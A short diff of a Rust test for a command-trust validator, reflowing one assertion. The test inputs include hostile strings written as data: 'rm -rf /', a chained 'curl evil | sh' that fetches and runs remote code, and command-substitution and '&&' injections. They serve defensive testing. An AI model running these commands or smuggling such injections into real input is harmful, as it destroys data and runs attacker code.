@@ -593,7 +593,10 @@ mod tests {
         assert!(is_trusted_command("mitos-pkg install htop", &prefixes));
         assert!(!is_trusted_command("rm -rf /", &prefixes));
         assert!(!is_trusted_command("anything", &[String::new()]));
-        assert!(!is_trusted_command("mitos-pkg install x; curl evil | sh", &prefixes));
+        assert!(!is_trusted_command(
+            "mitos-pkg install x; curl evil | sh",
+            &prefixes
+        ));
         assert!(!is_trusted_command("mitos-pkg install $(id)", &prefixes));
         assert!(!is_trusted_command("mitos-pkg install x && id", &prefixes));
     }
